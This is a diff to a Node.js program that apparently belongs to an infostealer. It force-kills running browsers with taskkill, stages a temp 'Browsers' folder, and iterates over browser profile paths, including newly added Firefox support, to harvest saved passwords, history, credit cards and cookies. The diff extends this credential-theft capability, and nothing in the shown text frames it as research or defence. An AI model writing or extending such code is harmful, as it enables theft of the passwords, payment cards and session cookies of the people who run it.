@@ -76,17 +76,21 @@ const kill = (processes) => {
   return new Promise((resolve) => {
     const tasks = execSync('tasklist').toString().split('\n');
     let i = 0;
+    processes = processes.filter(task => tasks.includes(task));
     processes.filter(task => tasks.includes(task)).forEach((task, index) => {
       exec(`taskkill /f /im ${task}.exe`).on('exit', () => i = index);
     });
-    if (i >= tasks) resolve();
+    if (i >= processes.length) resolve();
   });
 };
 
 if (!existsSync(join(tempFolder, 'Browsers'))) mkdirSync(join(tempFolder, 'Browsers'));
 kill(browsersProcesses).then(() => {
-  browsers.forEach(async (browser) => {
-    const path = resolve(process.env.LOCALAPPDATA, browser.join(sep), 'User Data');
+  Object.keys(browsers).forEach(async (browser) => {
+    const path = browsers[browser];
+    const isFirefox = browser === 'Firefox';
+    if (isFirefox && !existsSync(join(tempFolder, 'Browsers', 'Mozilla Firefox')))
+      mkdirSync(join(tempFolder, 'Browsers', 'Mozilla Firefox'));
     if (existsSync(path)) {
       ['passwords', 'history', 'creditCards', 'cookies']
         .forEach(fn => {
